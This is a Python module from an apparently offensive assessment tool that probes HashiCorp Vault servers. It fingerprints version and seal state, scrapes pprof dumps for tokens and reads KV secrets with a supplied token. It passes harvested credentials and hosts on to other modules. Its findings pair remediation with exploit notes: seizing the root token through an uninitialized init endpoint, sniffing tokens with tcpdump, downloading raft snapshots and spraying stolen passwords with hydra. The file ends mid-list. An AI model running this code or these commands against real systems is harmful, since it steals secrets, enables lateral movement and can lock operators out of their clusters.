"""HashiCorp Vault unauthenticated + token-supplied API probe.

Vault (8200/tcp HTTPS by default, 8201/tcp cluster) exposes a rich HTTP API.
The highest-value findings sit on the unauthenticated /v1/sys/* surface:

  * seal-status / health / leader       - version, cluster topology, ha/dr
  * init                                - uninitialized = attacker-controlled
                                          initialization race (returns root
                                          token + unseal keys on POST)
  * dev-mode signals                    - sealed=false + storage_type='inmem'
                                          + often no TLS = the well-known
                                          root token 'root' works
  * plaintext-listener + unsealed       - tls_disable=true on a live cluster:
                                          every token, unseal share, and
                                          secret transits in the clear
  * pprof / metrics                     - in-memory secret material leaks
                                          via goroutine dumps

With a supplied VAULT_TOKEN the module walks /v1/sys/mounts, /v1/sys/auth,
each KV mount for secret material, and the raft snapshot endpoint (HEAD
only - the actual snapshot is a full storage dump, potentially gigabytes,
so recce reports its size rather than pulling it).

Learned facts (cluster hostnames, raft peers, KV usernames/passwords) are
emitted through `probe_out['facts']` for the cross-service surfaces
(known_users / known_hostnames / relay_targets / creds) to consume.

Airgap-safe: stdlib http.client + ssl + json. Bounded (~10 endpoints * 3s).
"""
from __future__ import annotations

import http.client
import json
import re
import ssl

from ..core import proxy
from ..core.models import Host, Port


_DEFAULT_PORT = 8200
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"
_MAX_BODY = 500_000
_KV_DUMP_CAP = 25
_PPROF_LEAK_MAX = 200_000
_PPROF_LEAK_MAX_MATCHES = 12

# Pattern derived from Vault's documented token & unseal-share formats:
#   hvs.<b64url>   (server tokens, >=1.10)
#   hvb.<b64url>   (batch tokens)
#   hvr.<b64url>   (recovery tokens)
#   hva.<b64url>   (agent-wrapped tokens)
#   s.<24+ char>   (legacy client tokens, pre-1.10)
# plus the raw literals a goroutine dump exposes for unseal / root keys.
_PPROF_SECRET_RE = re.compile(
    rb"hv[abcrs]\.[A-Za-z0-9_-]{24,}"
    rb"|(?<![A-Za-z0-9])s\.[A-Za-z0-9]{24,}"
    rb"|unseal[_-]?key(?:s)?"
    rb"|root[_-]?token"
    rb"|VAULT_TOKEN",
    re.IGNORECASE,
)


# Verified Vault CVEs. Only entries whose (min, max) affected range is
# documented in HashiCorp's HCSEC bulletins may live here - never a version
# guess. Each fires only when the parsed version is in the closed range.
_VAULT_CVES: tuple[tuple[str, tuple[int, int, int], tuple[int, int, int], str, str], ...] = (
    ("CVE-2020-16250", (0, 0, 0), (1, 5, 4), "high",
     "AWS IAM auth method signature bypass (HCSEC-2020-18)"),
    ("CVE-2020-16251", (0, 0, 0), (1, 5, 4), "high",
     "GCP IAM auth method signature bypass (HCSEC-2020-19)"),
    ("CVE-2021-3024", (0, 0, 0), (1, 6, 1), "medium",
     "Audit log leaked sensitive attributes on some entity operations"),
    ("CVE-2023-25000", (0, 0, 0), (1, 12, 2), "medium",
     "HTTP request-smuggling via header manipulation (HCSEC-2023-07)"),
)


def is_vault(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid in (8200, 8201)
            or "vault" in svc or "vault" in prod)


def _http_single(ip: str, port: int, method: str, path: str, use_tls: bool,
                 body: bytes | None = None, headers: dict | None = None,
                 timeout: float = _TIMEOUT):
    """One request, no fallback. Returns (status, headers, body) or None."""
    conn = None
    try:
        if use_tls:
            ctx = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(
                ip, port, timeout=proxy.scaled(timeout), context=ctx)
        else:
            conn = http.client.HTTPConnection(
                ip, port, timeout=proxy.scaled(timeout))
        hdrs = {"User-Agent": _UA, "Connection": "close"}
        if headers:
            hdrs.update(headers)
        conn.request(method, path, body=body, headers=hdrs)
        resp = conn.getresponse()
        return (resp.status,
                {k.lower(): v for k, v in resp.getheaders()},
                resp.read(_MAX_BODY))
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def _http(ip: str, port: int, method: str, path: str,
          body: bytes | None = None, headers: dict | None = None,
          timeout: float = _TIMEOUT, prefer_tls: bool = True):
    """Vault defaults to HTTPS - try that FIRST, fall back to plain HTTP
    (tls_disable listeners). Returns (status, headers, body, used_tls)."""
    order = (True, False) if prefer_tls else (False, True)
    for use_tls in order:
        r = _http_single(ip, port, method, path, use_tls,
                         body=body, headers=headers, timeout=timeout)
        if r is not None:
            return (*r, use_tls)
    return None


def _parse_ver(v: str) -> tuple[int, int, int] | None:
    """'1.13.2+ent.hsm' / 'v1.5.4' -> (1, 13, 2). None on unparseable."""
    if not v:
        return None
    v = v.strip().lstrip("v")
    for sep in ("+", "-", " "):
        if sep in v:
            v = v.split(sep, 1)[0]
    parts = v.split(".")
    if len(parts) < 3:
        return None
    try:
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    except ValueError:
        return None


def _cve_matches(version: str) -> list[dict]:
    ver = _parse_ver(version)
    if not ver:
        return []
    out: list[dict] = []
    for cve, lo, hi, sev, summary in _VAULT_CVES:
        if lo <= ver <= hi:
            out.append({"id": cve, "severity": sev, "summary": summary})
    return out


def _pick_host(addr: str) -> str:
    """'https://vault-01.corp.local:8200' -> 'vault-01.corp.local'."""
    if not addr:
        return ""
    s = addr
    if "://" in s:
        s = s.split("://", 1)[1]
    s = s.split("/", 1)[0]
    if s.startswith("["):
        return s.split("]", 1)[0].lstrip("[")
    if s.count(":") == 1:
        s = s.rsplit(":", 1)[0]
    return s


def _is_ip(host: str) -> bool:
    return bool(host) and all(part.isdigit() for part in host.split(".")) \
        and host.count(".") == 3


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
          token: str = "") -> dict:
    """Fingerprint + walk Vault. When `token` is supplied also enumerates
    mounts / auth backends / KV secrets / raft topology."""
    out: dict = {
        "reachable": False, "version": "", "build_date": "",
        "sealed": None, "initialized": None, "seal_type": "",
        "cluster_name": "", "cluster_id": "", "storage_type": "",
        "t": 0, "n": 0,
        "ha_enabled": False, "leader_address": "",
        "leader_cluster_address": "", "is_self": False,
        "replication_performance_mode": "", "replication_dr_mode": "",
        "tls_enabled": None, "plaintext_listener": False,
        "http_and_tls": False,
        "dev_mode": False, "uninitialized": False,
        "pprof_reachable": False, "metrics_reachable": False,
        "pprof_leak": {},
        "mounts": [], "auth_backends": [], "auth_used": False,
        "kv_secrets": [], "raft_peers": [], "raft_snapshot_bytes": 0,
        "cves": [],
        "facts": {"hostnames": [], "domains": [], "users": [],
                  "hosts": [], "relay_targets": [], "credentials": []},
    }

    r = _http(ip, port, "GET", "/v1/sys/seal-status", timeout=timeout)
    if r is None:
        return out
    status, _hdrs, body, used_tls = r
    out["tls_enabled"] = used_tls
    out["plaintext_listener"] = not used_tls
    if status == 200:
        try:
            j = json.loads(body.decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        if isinstance(j, dict):
            out["reachable"] = True
            out["version"] = str(j.get("version") or "")[:80]
            out["build_date"] = str(j.get("build_date") or "")[:40]
            if j.get("sealed") is not None:
                out["sealed"] = bool(j.get("sealed"))
            if j.get("initialized") is not None:
                out["initialized"] = bool(j.get("initialized"))
            out["seal_type"] = str(j.get("type") or "")[:40]
            out["cluster_name"] = str(j.get("cluster_name") or "")[:80]
            out["cluster_id"] = str(j.get("cluster_id") or "")[:80]
            out["storage_type"] = str(j.get("storage_type") or "")[:40]
            try:
                out["t"] = int(j.get("t") or 0)
                out["n"] = int(j.get("n") or 0)
            except (TypeError, ValueError):
                pass
    else:
        out["reachable"] = True
    if not out["reachable"]:
        return out

    if used_tls:
        r2 = _http_single(ip, port, "GET", "/v1/sys/seal-status",
                          use_tls=False, timeout=timeout)
        if r2 is not None and r2[0] in (200, 429, 472, 473, 501, 503):
            out["plaintext_listener"] = True
            out["http_and_tls"] = True

    prefer = used_tls

    r = _http(ip, port, "GET",
              "/v1/sys/health?standbyok=true&perfstandbyok=true",
              timeout=timeout, prefer_tls=prefer)
    if r is not None:
        _st, _h, hbody, _u = r
        try:
            j = json.loads(hbody.decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        if isinstance(j, dict):
            out["ha_enabled"] = bool(j.get("ha_enabled"))
            out["replication_performance_mode"] = \
                str(j.get("replication_performance_mode") or "")[:40]
            out["replication_dr_mode"] = \
                str(j.get("replication_dr_mode") or "")[:40]
            if not out["cluster_name"]:
                out["cluster_name"] = str(j.get("cluster_name") or "")[:80]
            if not out["cluster_id"]:
                out["cluster_id"] = str(j.get("cluster_id") or "")[:80]
            if not out["version"]:
                out["version"] = str(j.get("version") or "")[:80]
            st_val = j.get("storage_type")
            if not out["storage_type"] and st_val:
                out["storage_type"] = str(st_val)[:40]

    r = _http(ip, port, "GET", "/v1/sys/init",
              timeout=timeout, prefer_tls=prefer)
    if r is not None and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        if isinstance(j, dict) and "initialized" in j:
            out["initialized"] = bool(j.get("initialized"))
            out["uninitialized"] = j.get("initialized") is False

    r = _http(ip, port, "GET", "/v1/sys/leader",
              timeout=timeout, prefer_tls=prefer)
    if r is not None and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        if isinstance(j, dict):
            out["leader_address"] = str(j.get("leader_address") or "")[:200]
            out["leader_cluster_address"] = \
                str(j.get("leader_cluster_address") or "")[:200]
            out["is_self"] = bool(j.get("is_self"))
            out["ha_enabled"] = out["ha_enabled"] or bool(j.get("ha_enabled"))

    r = _http(ip, port, "GET", "/v1/sys/pprof/goroutine?debug=1",
              timeout=timeout, prefer_tls=prefer)
    if r is not None and r[0] == 200 and len(r[2]) > 100:
        out["pprof_reachable"] = True

    r = _http(ip, port, "GET", "/v1/sys/metrics?format=prometheus",
              timeout=timeout, prefer_tls=prefer)
    if r is not None and r[0] == 200 and b"vault" in r[2][:5000].lower():
        out["metrics_reachable"] = True

    if out["pprof_reachable"]:
        leak = _pprof_leak_probe(ip, port, timeout, prefer)
        if leak:
            out["pprof_leak"] = leak

    if out["sealed"] is False and out["storage_type"] == "inmem":
        out["dev_mode"] = True

    if token:
        _authed_walk(ip, port, token, timeout, prefer, out)

    out["cves"] = _cve_matches(out["version"])
    _extract_facts(out)
    return out


def _redact_token(tok: str) -> str:
    """Show the token prefix only - never the full authenticator in evidence."""
    if len(tok) <= 8:
        return tok
    return tok[:8] + "..."


def _pprof_leak_probe(ip: str, port: int, timeout: float,
                      prefer: bool) -> dict:
    """T2 SAFE PROOF: pull a bounded goroutine + heap dump from the
    unauthenticated pprof endpoints and search the body for the RFC-shaped
    Vault token / unseal-key strings that leak into runtime dumps.

    Non-destructive:
      * one GET per endpoint, no follow-ups
      * body clamped at _PPROF_LEAK_MAX bytes
      * bounded socket timeout (proxy.scaled applied via _http)
      * captured tokens are redacted before being surfaced

    Returns evidence dict or empty {} when nothing matched / reachable.
    """
    evidence = {"endpoints": [], "matches": [], "bytes": 0}
    for path in ("/v1/sys/pprof/goroutine?debug=2",
                 "/v1/sys/pprof/heap?debug=1"):
        r = _http(ip, port, "GET", path, timeout=timeout, prefer_tls=prefer)
        if r is None or r[0] != 200:
            continue
        body = r[2][:_PPROF_LEAK_MAX]
        if len(body) < 100:
            continue
        evidence["endpoints"].append(path)
        evidence["bytes"] += len(body)
        for m in _PPROF_SECRET_RE.finditer(body):
            raw = m.group(0)
            try:
                tok = raw.decode("ascii")
            except UnicodeDecodeError:
                continue
            if tok[:2].lower() in ("s.", "hv"):
                tok = _redact_token(tok)
            if tok not in evidence["matches"]:
                evidence["matches"].append(tok)
            if len(evidence["matches"]) >= _PPROF_LEAK_MAX_MATCHES:
                break
        if len(evidence["matches"]) >= _PPROF_LEAK_MAX_MATCHES:
            break
    if not evidence["matches"]:
        return {}
    return evidence


def _authed_walk(ip: str, port: int, token: str, timeout: float,
                 prefer: bool, out: dict) -> None:
    """Walk /v1/sys/mounts, /v1/sys/auth, dump KV, raft peers + snapshot HEAD."""
    headers = {"X-Vault-Token": token}

    r = _http(ip, port, "GET", "/v1/sys/mounts", timeout=timeout,
              headers=headers, prefer_tls=prefer)
    if r is not None and r[0] == 200:
        out["auth_used"] = True
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        mounts_dict = j.get("data") if isinstance(j, dict) \
            and isinstance(j.get("data"), dict) else j
        for path, meta in (mounts_dict or {}).items():
            if not isinstance(meta, dict):
                continue
            out["mounts"].append({
                "path": path.rstrip("/"),
                "type": str(meta.get("type") or "")[:40],
                "description": str(meta.get("description") or "")[:120],
                "options": meta.get("options") if isinstance(
                    meta.get("options"), dict) else {},
            })

    r = _http(ip, port, "GET", "/v1/sys/auth", timeout=timeout,
              headers=headers, prefer_tls=prefer)
    if r is not None and r[0] == 200:
        out["auth_used"] = True
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        authd = j.get("data") if isinstance(j, dict) \
            and isinstance(j.get("data"), dict) else j
        for path, meta in (authd or {}).items():
            if not isinstance(meta, dict):
                continue
            out["auth_backends"].append({
                "path": path.rstrip("/"),
                "type": str(meta.get("type") or "")[:40],
                "description": str(meta.get("description") or "")[:120],
            })

    _dump_kv(ip, port, token, timeout, prefer, out)

    r = _http(ip, port, "GET", "/v1/sys/storage/raft/configuration",
              timeout=timeout, headers=headers, prefer_tls=prefer)
    if r is not None and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        data = j.get("data") if isinstance(j, dict) else {}
        servers = []
        if isinstance(data, dict):
            cfg = data.get("config") or {}
            if isinstance(cfg, dict):
                servers = cfg.get("servers") or []
            if not servers and isinstance(data.get("servers"), list):
                servers = data["servers"]
        for s in servers:
            if not isinstance(s, dict):
                continue
            out["raft_peers"].append({
                "node_id": str(s.get("node_id") or "")[:80],
                "address": str(s.get("address") or "")[:120],
                "leader": bool(s.get("leader")),
                "voter": bool(s.get("voter")),
            })

    r = _http(ip, port, "HEAD", "/v1/sys/storage/raft/snapshot",
              timeout=timeout, headers=headers, prefer_tls=prefer)
    if r is not None and r[0] in (200, 204):
        cl = r[1].get("content-length") or "0"
        try:
            out["raft_snapshot_bytes"] = int(cl)
        except ValueError:
            out["raft_snapshot_bytes"] = -1
        if out["raft_snapshot_bytes"] == 0:
            out["raft_snapshot_bytes"] = -1


def _dump_kv(ip: str, port: int, token: str, timeout: float,
             prefer: bool, out: dict) -> None:
    """Shallow KV walk - bounded to _KV_DUMP_CAP reads across all mounts."""
    headers = {"X-Vault-Token": token}
    kv_mounts = [m for m in out["mounts"]
                 if (m.get("type") or "").lower().startswith("kv")]
    read = 0
    for m in kv_mounts:
        if read >= _KV_DUMP_CAP:
            break
        mp = m["path"]
        is_v2 = (m["type"] == "kv-v2"
                 or (m.get("options") or {}).get("version") == "2")
        list_path = f"/v1/{mp}/metadata?list=true" if is_v2 \
            else f"/v1/{mp}?list=true"
        r = _http(ip, port, "LIST", list_path, timeout=timeout,
                  headers=headers, prefer_tls=prefer)
        if r is None or r[0] != 200:
            r = _http(ip, port, "GET", list_path, timeout=timeout,
                      headers=headers, prefer_tls=prefer)
        if r is None or r[0] != 200:
            continue
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            j = {}
        keys = []
        if isinstance(j, dict):
            d = j.get("data")
            if isinstance(d, dict):
                keys = d.get("keys") or []
        for key in keys:
            if read >= _KV_DUMP_CAP:
                break
            if not isinstance(key, str) or key.endswith("/"):
                continue
            data_path = f"/v1/{mp}/data/{key}" if is_v2 else f"/v1/{mp}/{key}"
            r = _http(ip, port, "GET", data_path, timeout=timeout,
                      headers=headers, prefer_tls=prefer)
            if r is None or r[0] != 200:
                continue
            try:
                j = json.loads(r[2].decode("utf-8", "replace"))
            except (ValueError, UnicodeDecodeError):
                continue
            data = j.get("data") if isinstance(j, dict) else None
            if is_v2 and isinstance(data, dict) and isinstance(
                    data.get("data"), dict):
                data = data["data"]
            if not isinstance(data, dict):
                continue
            out["kv_secrets"].append({"mount": mp, "key": key, "data": data})
            read += 1


def _extract_facts(out: dict) -> None:
    """Fold learned Vault facts into probe['facts'] so the cross-service
    surfaces (known_users / known_hostnames / relay_targets / creds) can
    fan them out. Only records values we ACTUALLY observed - never guesses."""
    facts = out["facts"]

    for addr in (out["leader_address"], out["leader_cluster_address"]):
        h = _pick_host(addr)
        if not h:
            continue
        if "." in h and not _is_ip(h):
            if h not in facts["hostnames"]:
                facts["hostnames"].append(h)
        elif h not in facts["hosts"]:
            facts["hosts"].append(h)

    if out["cluster_name"] and "." in out["cluster_name"]:
        cn = out["cluster_name"]
        if cn not in facts["hostnames"]:
            facts["hostnames"].append(cn)

    for peer in out["raft_peers"]:
        addr = peer.get("address") or ""
        host_only = _pick_host(addr)
        if host_only and _is_ip(host_only):
            if host_only not in facts["hosts"]:
                facts["hosts"].append(host_only)
        elif host_only and host_only not in facts["hostnames"]:
            facts["hostnames"].append(host_only)
        if addr and addr not in facts["relay_targets"]:
            facts["relay_targets"].append(addr)

    for ab in out["auth_backends"]:
        desc = ab.get("description") or ""
        for tok in desc.replace(",", " ").split():
            if "://" in tok:
                dom = _pick_host(tok)
                if dom and "." in dom and not _is_ip(dom) \
                        and dom not in facts["domains"]:
                    facts["domains"].append(dom)

    for kv in out["kv_secrets"]:
        data = kv.get("data")
        if not isinstance(data, dict):
            continue
        u = data.get("username") or data.get("user") or data.get("login") or ""
        p = data.get("password") or data.get("passwd") or data.get("pass") \
            or data.get("secret") or ""
        if isinstance(u, str) and u and u not in facts["users"]:
            facts["users"].append(u)
        if isinstance(u, str) and u and isinstance(p, str) and p:
            entry = {"username": u, "secret": p, "kind": "password",
                     "source": f"vault-kv:{kv['mount']}/{kv['key']}"}
            if entry not in facts["credentials"]:
                facts["credentials"].append(entry)


def vault_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_vault(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "vault", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_vault(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version") or "?"

            if pr.get("uninitialized"):
                out.append(_finding(
                    "critical",
                    "Vault uninitialized - attacker-controlled initialization race",
                    tgt,
                    f"Vault {ver} responded to /v1/sys/init with initialized=false. "
                    f"An uninitialized Vault reachable on the network can be "
                    f"POSTed to by ANY unauthenticated caller to complete "
                    f"initialization - the response returns the root token and "
                    f"unseal shares. First-writer-wins locks the operator out "
                    f"of their own cluster.",
                    f"curl -sk https://{h.ip}:{p.portid}/v1/sys/init "
                    "# do NOT POST unless the runbook says so - destructive",
                    "Initialize Vault BEFORE binding it to a reachable interface. "
                    "Bind to loopback or a private mgmt VLAN until the operator "
                    "has completed init and stored the unseal shares safely.",
                    ["CWE-306", "CWE-284", "CWE-665"], kind="vault_uninitialized",
                    exploit_note=(
                        "# DESTRUCTIVE: curl -sk -X POST -d "
                        "'{\"secret_shares\":1,\"secret_threshold\":1}' "
                        "https://<ip>:8200/v1/sys/init -> capture root_token + "
                        "unseal_keys_b64[0]; then vault unseal + "
                        "VAULT_TOKEN=<root> vault kv list."),
                    depth_tier="t1"))

            if pr.get("dev_mode"):
                out.append(_finding(
                    "critical",
                    "Vault running in dev mode (root token 'root', in-memory storage)",
                    tgt,
                    f"Vault {ver} - sealed=false + storage_type='inmem'. This "
                    f"is the signature of `vault server -dev`: always-unsealed, "
                    f"in-memory storage, well-known root token 'root'. Confirm "
                    f"with X-Vault-Token: root against /v1/sys/mounts (a 200 is "
                    f"full compromise - every mounted secret engine readable).",
                    f"curl -sk -H 'X-Vault-Token: root' "
                    f"https://{h.ip}:{p.portid}/v1/sys/mounts",
                    "Never run `vault server -dev` outside a developer's laptop. "
                    "Deploy real storage (raft/consul/integrated) and rotate the "
                    "root token immediately after init.",
                    ["CWE-798", "CWE-1188", "CWE-306"], kind="vault_dev_mode",
                    exploit_note=(
                        "curl -sk -H 'X-Vault-Token: root' "
                        "https://<ip>:8200/v1/sys/mounts; if 200, "
                        "VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=root vault kv "
                        "list secret/ and dump everything."),
                    depth_tier="t1"))

            if pr.get("sealed") is False and pr.get("plaintext_listener"):
                also = " (both http and https answer)" \
                    if pr.get("http_and_tls") else ""
                out.append(_finding(
                    "high",
                    "Vault unsealed over plaintext HTTP (tls_disable=true)",
                    tgt,
                    f"Vault {ver} is unsealed AND its listener answers plain "
                    f"HTTP{also}. Every X-Vault-Token, unseal share, and "
                    f"read/written secret transits in the clear - a passive "
                    f"observer on the segment can capture tokens and impersonate "
                    f"any client.",
                    f"curl http://{h.ip}:{p.portid}/v1/sys/seal-status",
                    "Set `tls_disable = false` on the listener and provide a "
                    "trusted certificate. Bind Vault to a segment shared only "
                    "with clients that MUST reach it.",
                    ["CWE-319", "CWE-311"], kind="vault_unsealed_no_tls",
                    exploit_note=(
                        "tcpdump -i any -A -s0 'tcp port 8200 and host <ip>' | "
                        "grep -iE 'X-Vault-Token|s\\.[A-Za-z0-9]{24,}' — grab "
                        "any client token then curl https://<ip>:8200/v1/sys/"
                        "mounts -H 'X-Vault-Token: <captured>'."),
                    depth_tier="t1"))

            if pr.get("pprof_reachable") or pr.get("metrics_reachable"):
                which = []
                if pr.get("pprof_reachable"):
                    which.append("/v1/sys/pprof/goroutine")
                if pr.get("metrics_reachable"):
                    which.append("/v1/sys/metrics?format=prometheus")
                leak = pr.get("pprof_leak") or {}
                leak_matches = leak.get("matches") or []
                tier = "t2" if leak_matches else "t1"
                detail = (
                    f"Vault {ver} answered {', '.join(which)} without a token. "
                    f"pprof goroutine dumps have historically leaked in-memory "
                    f"secret material (unseal shares, credentials in flight); "
                    f"prometheus metrics expose cluster-internal counters used "
                    f"to time attacks against the seal/unseal path.")
                if leak_matches:
                    detail += (
                        f" T2 PROOF: fetched {leak['bytes']:,} bytes from "
                        f"{', '.join(leak['endpoints'])} and matched "
                        f"{len(leak_matches)} in-memory Vault-secret pattern(s) "
                        f"(sample, redacted): {', '.join(leak_matches[:6])}.")
                f = _finding(
                    "medium",
                    "Vault debug / metrics endpoints reachable unauthenticated",
                    tgt,
                    detail,
                    f"curl -sk https://{h.ip}:{p.portid}/v1/sys/pprof/goroutine?debug=1",
                    "Set `unauthenticated_metrics_access = false` and require a "
                    "token for the pprof endpoints (`enable_debug = false` on the "
                    "listener, or wrap them behind an ACL policy).",
                    ["CWE-200", "CWE-497"], kind="vault_debug_disclosure",
                    exploit_note=(
                        "curl -sk 'https://<ip>:8200/v1/sys/pprof/goroutine?debug=2' "
                        "-o goroutine.txt; grep -aiE 'unseal|token|secret|password|"
                        "s\\.[A-Za-z0-9]{24,}' goroutine.txt; also fetch "
                        "/v1/sys/pprof/heap."),
                    depth_tier=tier)
                if leak_matches:
                    f["output"] = (
                        "pprof-leak evidence (redacted); endpoints="
                        + ",".join(leak["endpoints"])
                        + f"; bytes={leak['bytes']}"
                        + "; matches=" + ", ".join(leak_matches[:12]))
                out.append(f)

            if pr.get("auth_used"):
                out.append(_finding(
                    "medium",
                    "Vault authenticated - mounts and auth backends enumerated",
                    tgt,
                    f"Vault {ver} - supplied token authorised. "
                    f"{len(pr.get('mounts', []))} secret engine mount(s), "
                    f"{len(pr.get('auth_backends', []))} auth backend(s). "
                    f"Enumerated mounts: "
                    f"{', '.join(sorted({m['path'] for m in pr.get('mounts', [])})[:12]) or '-'}. "
                    f"Auth backends: "
                    f"{', '.join(sorted({a['type'] for a in pr.get('auth_backends', [])})) or '-'}. "
                    f"These paths + auth types are the exploit surface the "
                    f"next capabilities (KV dump / raft snapshot / auth login) "
                    f"walk.",
                    f"curl -sk -H 'X-Vault-Token: <token>' "
                    f"https://{h.ip}:{p.portid}/v1/sys/mounts",
                    "Audit the policy attached to any token in use; tokens "
                    "usually need only a small subset of mounts.",
                    ["CWE-200"], kind="vault_authed_mounts",
                    exploit_note=(
                        "VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=<t> vault token "
                        "lookup; vault policy list; vault auth list; then vault kv "
                        "list on each kv mount."),
                    depth_tier="t2"))

            if pr.get("kv_secrets"):
                sample = ", ".join(
                    sorted({f"{s['mount']}/{s['key']}" for s in pr["kv_secrets"]})[:8])
                out.append(_finding(
                    "critical",
                    "Vault KV secret dump succeeded - plaintext secrets returned",
                    tgt,
                    f"Vault {ver} - the supplied token read "
                    f"{len(pr['kv_secrets'])} secret(s) across "
                    f"{len({s['mount'] for s in pr['kv_secrets']})} mount(s). "
                    f"Sample paths: {sample}"
                    + ("... (truncated to bounded dump cap)"
                       if len(pr['kv_secrets']) >= _KV_DUMP_CAP else "")
                    + ". Every plaintext secret feeds known_users / "
                    "known_hashes / known_creds for the rest of the scan.",
                    f"curl -sk -H 'X-Vault-Token: <token>' "
                    f"https://{h.ip}:{p.portid}/v1/<mount>/data/<key>",
                    "Rotate every secret dumped. Attach a policy that scopes "
                    "the token to the ONE mount it needs (no `path \"*\"`).",
                    ["CWE-522", "CWE-200"], kind="vault_authed_secret_read",
                    exploit_note=(
                        "For each captured vault-kv credential: hydra -L <users> "
                        "-P <pw> ssh://<ip>; smbclient -L -U user%pass //<ip>; "
                        "test each disclosed URL/hostname for reuse."),
                    depth_tier="t3"))

            if pr.get("raft_snapshot_bytes"):
                size = pr["raft_snapshot_bytes"]
                sz_txt = "unknown size" if size < 0 else f"{size:,} bytes"
                out.append(_finding(
                    "critical",
                    "Vault raft snapshot reachable - full storage dump available",
                    tgt,
                    f"Vault {ver} - the supplied token has sudo/root capability "
                    f"on /v1/sys/storage/raft/snapshot ({sz_txt} available). A "
                    f"full snapshot is the ENTIRE Vault storage: every KV "
                    f"secret, policy, and auth backend config as a gzip'd "
                    f"BoltDB. Offline-decryptable if the master key is "
                    f"recovered from the same host. Raft peers observed: "
                    f"{len(pr.get('raft_peers', []))}.",
                    f"curl -sk -H 'X-Vault-Token: <root>' "
                    f"https://{h.ip}:{p.portid}/v1/sys/storage/raft/snapshot "
                    f"-o raft.snap",
                    "Never issue root/sudo tokens to non-operator identities. "
                    "Restrict `sys/storage/raft/snapshot` in the policy attached "
                    "to CI/service tokens.",
                    ["CWE-200", "CWE-284"], kind="vault_raft_snapshot_dump",
                    exploit_note=(
                        "curl -sk -H 'X-Vault-Token: <root>' "
                        "https://<ip>:8200/v1/sys/storage/raft/snapshot -o "
                        "vault.snap; then vault operator raft snapshot inspect "
                        "vault.snap; strings vault.snap | grep -iE "
                        "'password|token|secret'."),
                    depth_tier="t2"))

            for cve in pr.get("cves", []):
                out.append(_finding(
                    cve["severity"],
                    f"Vault {ver} affected by {cve['id']}",
                    tgt,
                    f"Vault {ver} falls in the affected version range for "
                    f"{cve['id']}: {cve['summary']}. Confirmed by version "
                    f"string returned from /v1/sys/seal-status.",
                    f"# ref: https://discuss.hashicorp.com/c/security/54 - {cve['id']}",
                    "Upgrade Vault to the patched release listed in the "
                    "HCSEC bulletin.",
                    ["CWE-1395"], kind="vault_cve",
                    exploit_note=(
                        "For CVE-2020-16250/16251: attempt vault write "
                        "auth/aws/login role=<r> iam_http_request_method=POST "
                        "...  with a spoofed X-Vault-AWS-IAM-Server-ID header — "
                        "see HCSEC-2020-18 PoC."),
                    depth_tier="t0"))

            state_bits = []
            if pr.get("sealed") is True:
                state_bits.append("sealed")
            elif pr.get("sealed") is False:
                state_bits.append("unsealed")
            if pr.get("initialized") is True:
                state_bits.append("initialized")
            if pr.get("ha_enabled"):
                state_bits.append("ha")
            out.append(_finding(
                "info", "Vault endpoint reachable", tgt,
                f"Vault {ver} reachable ({', '.join(state_bits) or '?'}). "
                f"Storage: {pr.get('storage_type') or '?'}. "
                f"Cluster: {pr.get('cluster_name') or '?'}. "
                f"Leader: {pr.get('leader_address') or '?'}. "
                f"TLS: {'yes' if pr.get('tls_enabled') else 'no'}.",
                f"curl -sk https://{h.ip}:{p.portid}/v1/sys/seal-status",
                "Any looted VAULT_TOKEN can be tried against this endpoint.",
                [], kind="vault_reachable",
                exploit_note=(
                    "curl -sk https://<ip>:8200/v1/sys/seal-status; note version "
                    "-> check HCSEC bulletins."),
                depth_tier="t0"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Seal status + version fingerprint",
         "cmd": f"curl -sk https://{ip}:{port}/v1/sys/seal-status"},
        {"step": "Health (status code encodes state: 200/429/472/473/501/503)",
         "cmd": f"curl -sk -o /dev/null -w '%{{http_code}}\\n' "
                f"https://{ip}:{port}/v1/sys/health"},
        {"step": "Init state - initialized=false = attacker-race",
         "cmd": f"curl -sk https://{ip}:{port}/v1/sys/init"},
        {"step": "Leader / raft topology",
         "cmd": f"curl -sk https://{ip}:{port}/v1/sys/leader"},
        {"step": "Dev-mode check (X-Vault-Token: root)",
         "cmd": f"curl -sk -H 'X-Vault-Token: root' "
                f"https://{ip}:{port}/v1/sys/mounts"},
        {"step": "With a supplied token: enumerate mounts + auth backends",
         "cmd": f"VAULT_ADDR=https://{ip}:{port} VAULT_TOKEN=<t> vault secrets list"},
